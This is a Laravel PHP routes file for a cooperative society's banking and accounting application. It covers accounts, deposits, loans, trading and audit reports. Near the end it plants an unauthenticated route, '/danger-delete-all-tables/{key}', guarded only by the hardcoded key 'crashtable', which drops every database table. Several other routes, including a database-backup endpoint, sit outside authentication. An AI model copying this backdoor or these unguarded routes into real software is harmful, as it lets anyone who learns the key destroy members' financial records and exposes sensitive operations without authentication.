<?php

use App\Http\Controllers\Additional\WardReportCtrl;
use App\Http\Controllers\Audit\reportController;
use App\Http\Controllers\Calculation\interestOnFd;
use App\Http\Controllers\Daily_Report\dcrController;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\Master\salePartyController;
use App\Http\Controllers\MasterController;
use App\Http\Controllers\Trading\saleController;
use App\Http\Controllers\Transaction\loanController;
use App\Http\Controllers\Transaction\opennewacController;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Route;

Auth::routes();
/*Route::get('password',function (){

   return Hash::make('12345678');
});*/
Route::get('downloads','DownloadsController@downloads');
Route::post('post-balance-book-status','Balance\balanceController@balanceBookStatuspost');
Route::post('update-open-table-fields','Balance\balanceController@updateOpenTableField');
Route::group(['middleware' => ['auth'],'namespace'=>'Controllers'], function() {
    Route::resource('roles','RoleController');
    Route::resource('users','UserController');
    Route::get('/users/create/{id?}', 'UserController@updatelocation');
    Route::get('/users/{userid?}/edit/{id?}', 'UserController@updatelocation');
    Route::get('/users/password/{id?}', 'UserController@editpassword');
    Route::PUT('/users/password/{id}', 'UserController@updatepassword');
    Route::get('/users/profile/{id}', 'UserController@userprofile');
    Route::resource('products','ProductController');


});
Route::get('database-backup','databaseBackupController@index');
Route::get('/', 'HomeController@index')->name('/');
Route::get('/home', 'HomeController@index')->name('/home');
Route::get('get-district', [HomeController::class, 'GetDistrictById'])->name('get.district.by.state');
Route::get('get-patwar', [HomeController::class, 'GetPatwarById'])->name('get.patwar.by.district');
Route::get('get-panchayat', [HomeController::class, 'GetPanchayatById'])->name('get.panchayat.by.patwar');
Route::get('get-village', [HomeController::class, 'GetVillageById'])->name('get.village.by.panchayat');
Route::post('lock-today', [HomeController::class, 'LockToday'])->name('lock.today');
Route::post('search-daily-cash-coin',[HomeController::class, 'SearchDailyCashCoin'])->name('search.daily.cash.coin');
Route::post('search-daily-cash-coin-update',[HomeController::class, 'SearchDailyCashCoinUpdate'])->name('search.daily.cash.coin.update');

// Master Prefix
Route::group(['prefix'=>'/master','namespace' => 'Master'], function(){
		Route::resource('/member-type', 'membertypeController');
		Route::resource('/account-type', 'accounttypeController');
		Route::resource('/company-address', 'companyaddressController');
		Route::get('/company-address/create/{id?}', 'companyaddressController@updatelocation');
		Route::get('/company-address/{idd}/edit/{id}', 'companyaddressController@updatelocation');
		Route::resource('/ration-depot', 'rationdepotController');
		Route::resource('/state', 'stateController');
		Route::resource('/district', 'districtController');
            Route::group(['prefix'=>'/patwar'], function (){
                Route::get('/', [MasterController::class, 'PatwarList'])->name('master.patwar.list');
                Route::get('create', [MasterController::class, 'PatwarListCreate'])->name('master.patwar.list.create');
                Route::post('create', [MasterController::class, 'PatwarListSubmit'])->name('master.patwar.list.submit');
            });
            Route::group(['prefix'=>'/panchayat'], function (){
                Route::get('/', [MasterController::class, 'PanchayatList'])->name('master.panchayat.list');
                Route::get('create', [MasterController::class, 'PanchayatListCreate'])->name('master.panchayat.list.create');
                Route::post('create', [MasterController::class, 'PanchayatListSubmit'])->name('master.panchayat.list.submit');
            });
            Route::group(['prefix'=>'/village'], function (){
                Route::get('/', [MasterController::class, 'VillageList'])->name('master.village.list');
                Route::get('create', [MasterController::class, 'VillageListCreate'])->name('master.village.list.create');
                Route::post('create', [MasterController::class, 'VillageListSubmit'])->name('master.village.list.submit');
            });
            Route::group(['prefix'=>'/relation'], function (){
                Route::get('/', [MasterController::class, 'RelationList'])->name('master.relation.list');
                Route::get('create', [MasterController::class, 'RelationListCreate'])->name('master.relation.list.create');
                Route::post('create', [MasterController::class, 'RelationListSubmit'])->name('master.relation.list.submit');
            });

		Route::resource('/session', 'sessionController');
		Route::resource('/interest', 'interestController');
		Route::resource('/group', 'groupController');
		Route::resource('/sub-group', 'subgroupController');
		Route::resource('/balance-sheet-head', 'balsheetheadController');
		Route::resource('/loan', 'loanController');
		Route::resource('/loan-purpose', 'loanpurposeController');
		Route::resource('/branch', 'branchController');
		Route::resource('/designation', 'designationController');
		Route::resource('/bank', 'bankController');
		Route::get('/update-tbl-ledger', 'updateController@index');
		Route::post('/update-tbl-ledger', 'updateController@update');
		Route::resource('/tax', 'taxController');
		Route::resource('/unit', 'unitController');
		Route::resource('/product-type', 'productTypeController');
		Route::resource('/products', 'productController');
		Route::resource('/purchase-party', 'purchasePartyController');

		Route::get('/sale-party', [salePartyController::class, 'index'])->name('master.sale.party.index');
		Route::get('/sale-party/create', [salePartyController::class, 'create'])->name('master.sale.party.create');
		Route::post('/sale-party', [salePartyController::class, 'store'])->name('master.sale.party.submit');
		Route::get('{id?}/sale-party', [salePartyController::class, 'edit'])->name('master.sale.party.edit');
		Route::put('sale-party/{id?}', [salePartyController::class, 'update'])->name('master.sale.party.update');
		Route::delete('sale-party/{id?}', [salePartyController::class, 'destroy'])->name('master.sale.party.delete');
});

// Transaction Prefix
Route::group(['prefix'=>'/transaction','namespace' => 'Transaction'], function(){
    	Route::get('/loan/guarantor_one', 'loanController@getcheckguarantor');
	// Open New A/c
		Route::resource('/new-account', 'opennewacController');
		Route::get('/new-account/print/{id?}', 'opennewacController@printProfile');
		Route::get('/new-account/create/{id?}', 'opennewacController@updatelocation');
		Route::get('/new-account/{dd?}/edit/{id?}', 'opennewacController@updatelocation');
		Route::post('search-account',[opennewacController::class, 'SearchAccount'])->name('search-account');

		// Assign account permission to agent
		// Fetch accounts for lazy loading
		Route::get('agent-permission', [opennewacController::class, 'agentPermission'])->name('agent-permission');
		Route::get('fetch-accounts', [opennewacController::class, 'fetchAccounts'])->name('fetch.accounts');
		Route::post('/save-assignments', [opennewacController::class, 'saveAgentAssignments'])->name('save.assignments');
		Route::get('/fetch-assigned-accounts', [opennewacController::class, 'fetchAssignedAccounts'])->name('fetch.assigned.accounts');

		


	// Open Short A/c
        Route::get('open-short-account', [opennewacController::class, 'OpenShortAccount'])->name('transaction.open.short.account');
        Route::post('open-short-account', [opennewacController::class, 'OpenShortAccountSubmit'])->name('transaction.open.short.account.submit');
    // Open Short A/c 2
        Route::get('create-short-account', [opennewacController::class, 'CreateShortAccount'])->name('transaction.create.short.account');
        Route::post('create-short-account', [opennewacController::class, 'CreateShortAccountSubmit'])->name('transaction.create.short.account.submit');
	// Share A/c
		Route::get('/share/create/{id}/{token}', 'share_ac_Controller@create')->name('share.create');
		Route::resource('/share', 'share_ac_Controller', ['except' => ['create']]);
		Route::post('/share/blur', 'share_ac_Controller@accountdetail');
		Route::get('/share/{id}/print', 'share_ac_Controller@printRd');
	// Saving A/c
		Route::get('/saving-account/create/{id}/{token}', 'saving_ac_Controller@create')->name('saving-account.create');
		Route::resource('/saving-account', 'saving_ac_Controller', ['except' => ['create']]);
		Route::post('/saving-account/blur', 'saving_ac_Controller@accountdetail');
		Route::get('/saving-account/account/{ac_no}/{member_id}', 'saving_ac_Controller@index');
		Route::get('/saving-account/{id}/print', 'saving_ac_Controller@printRd');

	// DDS A/c
		Route::get('/dds/create/{id}/{token}', 'dds_ac_Controller@create')->name('dds.create');
		Route::resource('/dds', 'dds_ac_Controller', ['except' => ['create']]);
		Route::post('/dds/blur', 'dds_ac_Controller@accountdetail');
	// Fixed Deposite A/c
		Route::resource('/fixed-deposite', 'fdController');
		Route::get('/fixed-deposite/{id}/matured/', 'fdController@editMatureFd');
		Route::PUT('/fixed-deposite/{id}/matured/', 'fdController@matureFd');
		Route::PUT('/fixed-deposite/{id}/renew/', 'fdController@renewFd');
		Route::post('/fixed-deposite/blur', 'fdController@accountdetail');
		Route::get('/fixed-deposite/print-pdf/{id}/{token}', 'fdController@printPDF');

	// Bank Fixed Deposite A/c
		Route::resource('/bank-fixed-deposite', 'bankFdController');
		Route::get('/bank-fixed-deposite/{id}/matured', 'bankFdController@editMatureBankFd');
		Route::PUT('/bank-fixed-deposite/{id}/matured', 'bankFdController@updateMatureBankFd');
		Route::post('/bank-fixed-deposite/blur', 'bankFdController@accountdetail');
		Route::get('/bank-fixed-deposite/print-pdf/{id}/{token}', 'bankFdController@printPDF');

	// Recurring Deposite A/c
		Route::resource('/recurring-deposit', 'rdController');
		Route::get('/rd-installment', 'rdController@rdInstallmentCreate')->name('transaction.rd.installment');
		Route::get('/rd-installment-record', 'rdController@rdInstallmentRecord')->name('transaction.rd.installment.record');
		Route::post('/rd-installment', 'rdController@rdInstallmentRecordSubmit')->name('transaction.rd.installment.record.submit');
		Route::get('/recurring-deposit/{id}/print', 'rdController@printRd');
		Route::get('/recurring-deposit/{id}/matured', 'rdController@editMaturedRd');
		Route::PUT('/recurring-deposit/{id}/matured', 'rdController@updateMaturedRd');
		Route::post('/recurring-deposite/blur', 'rdController@accountdetail');
		Route::get('/recurring-deposit/installment/{id}/{token}', 'rdController@rdinstallment');
		Route::post('/recurring-deposit/installment', 'rdController@rdinstallmentPost');
		Route::get('/recurring-deposit/print-pdf/{id}/{token}', 'rdController@printPDF');
	// Daily Recurring Deposite A/c
		Route::resource('/drd', 'drd_Controller');
		Route::get('/drd/{id}/matured', 'drd_Controller@editMaturedDRD');
		Route::PUT('/drd/{id}/matured', 'drd_Controller@updateMaturedDRD');
		Route::post('/drd/blur', 'drd_Controller@accountdetail');
		Route::get('/drd/installment/{id}/{token}', 'drd_Controller@rdinstallment');
		Route::post('/drd/installment', 'drd_Controller@rdinstallmentPost');
	// Loan A/c
		Route::resource('/loan', 'loanController');
		Route::PUT('/loan-gaurntor/{id}', 'loanController@updateGaurntor');
		Route::post('/loan/blur', 'loanController@accountdetail');
		Route::post('/loan/loan-type', 'loanController@loandetail');
		Route::any('/loan/{id}/{token}/recovery/{rec_date?}', 'loanController@loanrecover');
		Route::post('/loan/recover_payment', 'loanController@recoverpayment');
		Route::delete('/loan/recover_payment/{id}/{did}/{date?}', 'loanController@deleteRecoverPayment');
		Route::get('/loan/notice/{id}/{token}/{pt}/{pr}/{doa}', 'loanController@printPDF');

		Route::get('loan-edit', [loanController::class, 'LoanEdit'])->name('transaction.loan.edit');
		Route::put('loan-edit/{id}', [loanController::class, 'LoanUpdate'])->name('transaction.loan.update');
	// MIS A/c
		Route::resource('/mis', 'misController');
		Route::get('/mis/{id}/matured', 'misController@editMaturedMis');
		Route::PUT('/mis/{id}/matured', 'misController@updateMaturedMis');
		Route::post('/mis/blur', 'misController@accountdetail');
		Route::post('/mis/interest', 'misController@storeInterestToSavinAndTbl');
		Route::get('/mis/print-pdf/{id}/{token}', 'misController@printPDF');

	// voucher
		Route::resource('/voucher-single', 'singleVoucherController');
		Route::get('/voucher-single/create/{id}', 'singleVoucherController@getSubGroup');
		Route::get('/voucher-single/{iid?}/edit/{id}', 'singleVoucherController@getUpdateSubGroup');
		// Route::get('/voucher/create/subgroup/{id}', 'voucherController@getGroup');

	// voucher Multi
		Route::resource('/voucher', 'voucherController');
		Route::get('/voucher/create/{id}', 'voucherController@getSubGroup');
		Route::get('/voucher/{iid?}/edit/{id}', 'voucherController@getUpdateSubGroup');
		// Route::get('/voucher/create/subgroup/{id}', 'voucherController@getGroup');

});

// Trading Prefix
Route::group(['prefix'=>'/trading','namespace' => 'Trading'], function(){
		Route::resource('/products', 'productController');
		Route::resource('/purchase', 'PurchaseController');
		Route::post('/purchase/aproved', 'PurchaseController@aprovedItem');
		Route::get('/purchase/create/{id}', 'PurchaseController@getUnit');
		Route::get('/purchase/productItem/{id}', 'PurchaseController@deleteItem');
		Route::get('/purchase/product-name/{id?}', 'PurchaseController@getProductName')->name('purchase.product.get.name');

		Route::resource('/sale', 'saleController');
		Route::post('/sale/aproved', 'saleController@aprovedItem');
		Route::get('/sale/create/{id}', 'saleController@getUnit');
		Route::get('/sale/productItem/{id}', 'saleController@deleteItem');
		Route::get('sale-print', [saleController::class, 'PrintSale'])->name('trading.sale.print');


		Route::resource('/sale-purchase-report', 'salePurchaseController');
		Route::resource('/item-ledger', 'itemLedgerController');

		Route::get('sale-collection-report', [saleController::class, 'CollectionReport'])->name('trading.sale.collection.report');
		Route::get('stock-report',[\App\Http\Controllers\Trading\salePurchaseController::class, 'StockReport'])->name('trading.stock.report');
});


// Daily Report Prefix
Route::group(['prefix'=>'/daily-report','namespace' => 'Daily_Report'], function(){
	// Open New A/c
	    Route::get('/day-book-new', 'dayBookController@index_new');
		Route::get('/day-book-combine', 'dayBookController@tempIndex')->name('daily.report.cash.book.combine');
		Route::get('/day-book', 'dayBookController@index');
		// Route::get('/day-book/print-pdf/{from_date}/{to_date}', 'dayBookController@printPDF');
		Route::get('/day-book/print-pdf/{from_date?}/{to_date?}', 'dayBookController@printPDF');
//		Route::get('/day-book/print-combine', function (){
//		    return view('Daily_Report.Day_Book.pdf_view_combine');
//        })->name('daily.report.day.book.print');
		Route::get('/dcr', 'dcrController@index');
		Route::get('/shadow', 'dcrController@shadowFunc');
		Route::get('/shadow/{id}/edit', 'dcrController@edit');
		Route::PUT('/shadow/{id}', 'dcrController@update');
		Route::get('fd-status-report', [dcrController::class, 'FdStatusReport'])->name('daily.report.fd.status.report');
		Route::get('bank-fd-status-report', [dcrController::class, 'BankFdStatusReport'])->name('daily.report.bank.fd.status.report');
		Route::get('loan-recovery-report', [dcrController::class, 'LoanRecoveryReport'])->name('daily.report.loan.recovery.report');

});

// Balance Report Prefix
Route::group(['prefix'=>'/balance-report','namespace' => 'Balance'], function(){
			Route::get('/share', 'balanceController@index');
			Route::get('/dds', 'balanceController@ddsBalance');
			Route::get('/saving', 'balanceController@savingBalance');
			Route::get('/update-saving', 'balanceController@UpdateSavingBalance')->name('balance.report.update.saving');
			Route::get('/update-share', 'balanceController@UpdateShareBalance')->name('balance.report.update.share');
			Route::get('/update-loan-member-type', 'balanceController@UpdateLoanReturnMemberType')->name('balance.report.update.loan-return-member-type');
			Route::get('/saving-paginate', 'balanceController@savingBalancePaginate');
			Route::get('/fixed-deposit', 'balanceController@fdBalance');
			Route::get('/bank-fd', 'balanceController@bankFDBalance');
			Route::get('/by-day-bank-fd', 'balanceController@bankFDByDayBalance');
			Route::get('/rd', 'balanceController@rdBalance');
			Route::get('/drd', 'balanceController@drdBalance');
			Route::get('/mis', 'balanceController@misBalance');
			Route::get('/loan', 'balanceController@loanBalance');
			Route::get('/balance-share-saving', 'balanceController@balancesharesaving');
			Route::get('/balance-book', 'balanceController@balanceBook');
			Route::get('/balance-book-status', 'balanceController@balanceBookStatus');
			Route::get('/balance-book-list', 'balanceController@balanceBookList')->name('balance.book.list');
			Route::get('/balance-book-paginate', 'balanceController@balanceBookPaginate');
//			Route::get('test',function (){
//                return \App\saving_ac_model::whereAccountNo(37)->get();
//            });
        Route::get('product-export', 'balanceController@productsExport')->name('product.export');
        Route::post('generate-pdf', 'balanceController@generatePDF')->name('balance-report.balance-book.download-pdf');

});

// Balance Report Page Total
Route::group(['prefix'=>'/balance-report-page-total','namespace' => 'Balance'], function(){
    Route::get('/fixed-deposit', 'BalanceReportPageTotal@fdBalance')->name('balance.report.page.total.fixed.deposit');
    Route::get('/balance-book', 'BalanceReportPageTotal@balanceBook')->name('balance.report.page.total.balance.book');
    Route::get('/rd', 'BalanceReportPageTotal@rdBalance')->name('balance.report.page.total.balance.rd');
    Route::get('/bank-fd', 'BalanceReportPageTotal@bankFDBalance')->name('balance.report.page.total.bank.fd');
    Route::get('/loan-advancement', 'BalanceReportPageTotal@loanAdvanceReport')->name('balance.report.page.total.loan-advancement');
//    Route::get('test',function (){
//        return \App\saving_ac_model::whereAccountNo(37)->get();
//    });
    Route::get('product-export', 'BalanceReportPageTotal@productsExport')->name('product.export');
    Route::post('generate-pdf', 'BalanceReportPageTotal@generatePDF')->name('balance-report.balance-book.download-pdf');

});

//Detaild Balance Report Prefix
Route::group(['prefix'=>'/detailed-balance-report','namespace' => 'Balance'], function(){
	// Share Balance Report
			Route::get('/share', 'balanceController@detailShareBal');
	// DDS Balance Report
			Route::get('/dds', 'balanceController@detailDDSBal');
	// Saving Balance Report
			Route::get('/saving', 'balanceController@detailSavingBal');
	// FD Balance Report
			Route::get('/fixed-deposit', 'balanceController@detailFDBal');
	// Loan Defaulter
			Route::get('/loan-defaulter', 'balanceController@loanDefaulter');
			Route::get('/npa', 'balanceController@npaReport');
});

//Ledger Report Prefix
Route::group(['prefix'=>'/ledger-report','namespace' => 'Ledger'], function(){
	// Share Balance Report
			Route::any('/personal-ledger', 'reportController@personalLedger');
			Route::get('/print-personal-ledger', 'reportController@printPersonalLedger')->name('ledger.print-personal-ledger');
            Route::any('/fd-ledger', 'reportController@fdLedger')->name('ledger.fd-ledger');
            Route::any('/print-fd-ledger', 'reportController@printFdLedger')->name('ledger.print-fd-ledger');
			Route::get('/head-ledger', 'reportController@headLedger');
			Route::get('/general-ledger', 'reportController@generalLedger');
			Route::get('/general-ledger-all', 'reportController@generalLedgerAll')->name('ledger.general-ledger-all');
});

//Audit Balance Report Prefix
Route::group(['prefix'=>'/audit-report','namespace' => 'Audit'], function(){
	// Share Balance Report
			Route::get('/rd', [reportController::class, 'rdReport']);
			Route::get('/trading-account', [reportController::class, 'tradingAccountReport']);
			Route::get('/trading-pl', [reportController::class, 'tradingPLReport']);
			Route::get('/profit-loss', [reportController::class, 'profitLossReport'])->name('audit.report.profit.loss');
			Route::get('/loan-advancement', [reportController::class, 'loanAdvanceReport']);
			Route::get('/loan-detail', [reportController::class, 'loanAdvanceReportDetail'])->name('audit.report.loan.advance.detail');

			Route::get('/balance-sheet', [reportController::class, 'balanceSheet']);
			Route::get('/balance-sheet/pdf/{dt?}/{fy?}/{br?}', [reportController::class, 'balanceSheetPDF']);
			Route::get('/trial-balance', [reportController::class, 'trialBalance']);


});

//Additional Balance Report Prefix
Route::group(['prefix'=>'/additional-report','namespace' => 'Additional'], function(){
		Route::resource('/agent-account-report', 'agentAcController');
		Route::get('/ward-report', 'WardReportCtrl@index');
		Route::get('society-status', [WardReportCtrl::class, 'SocietyStatus'])->name('additional.report.society.status');
});

//Calculations Report
Route::group(['prefix'=>'/calculations','namespace' => 'Calculation'], function(){
		Route::get('/dividend-calculation', 'dividendController@index');
		Route::post('/dividend-calculation', 'dividendController@store');
		Route::get('/dividend-list', 'dividendController@dividendList');
		Route::post('/dividend-list', 'dividendController@storeDividendToSavinAndTbl');
		Route::get('/dividend-list/{id}/edit', 'dividendController@edit');
		Route::PUT('/dividend-list/{id}', 'dividendController@update');

		// Interest on Saving
		Route::get('/interest-on-saving', 'interestController@index');
		Route::get('/print-interest-on-saving', 'interestController@printInterestOnsaving');
		Route::post('/interest-on-saving', 'interestController@store');
		Route::get('/print-interest-on-saving-list', 'interestController@printdividendList');
		Route::get('/interest-on-saving-list', 'interestController@dividendList');
		Route::post('/interest-on-saving-list', 'interestController@storeDividendToSavinAndTbl');
		Route::get('/interest-on-saving-list/{id}/edit', 'interestController@edit');
		Route::get('/interest-on-saving-list-edit', 'interestController@getedit');
		Route::PUT('/interest-on-saving-list/{id}', 'interestController@update');
		Route::get('generate-pdf','interestController@generatePDF');

		// Interest on FD
        Route::get('/interest-on-fd', [interestOnFd::class, 'index'])->name('calculations.interest-on-fd');
});

//Financial Year
Route::group(['prefix'=>'/financial-year','namespace' => 'FinancialYear'], function(){
		Route::resource('/year-end', 'yearEndController');

});

Route::group(['prefix'=>'setting'], function (){
    Route::get('loan-balance-second', [\App\Http\Controllers\Balance\balanceController::class, 'loanBalanceSecond'])->middleware('auth')->name('setting.loan-controller-second');
    Route::get('fixed-deposit-second', [\App\Http\Controllers\Balance\balanceController::class, 'fdBalanceSecond'])->middleware('auth')->name('setting.fixed-deposit-second');
    Route::get('rd-second', [\App\Http\Controllers\Balance\balanceController::class, 'rdBalanceSecond'])->middleware('auth')->name('setting.rd-second');
    Route::get('audit-report/show-balance-sheet', [reportController::class, 'showBalanceSheet'])->middleware('auth')->name('setting.audit-report.balance-sheet');
    Route::post('audit-report/update-balance-sheet', [reportController::class, 'balanceSheetUpdate'])->middleware('auth')->name('setting.audit-report.update-balance-sheet');
});

Route::get('/danger-delete-all-tables/{key}', function ($key) {

    if ($key !== 'crashtable') {
        abort(403);
    }

    DB::statement('SET FOREIGN_KEY_CHECKS=0');

    $tables = DB::select('SHOW TABLES');
    $database = DB::getDatabaseName();
    $keyName = 'Tables_in_' . $database;

    foreach ($tables as $table) {
        DB::statement("DROP TABLE IF EXISTS `{$table->$keyName}`");
    }

    DB::statement('SET FOREIGN_KEY_CHECKS=1');

    return '✅ All tables deleted successfully.';
});


Route::group([], function () {
    require_once(__DIR__ . '/server.php');
    require_once(__DIR__ . '/define.php');
});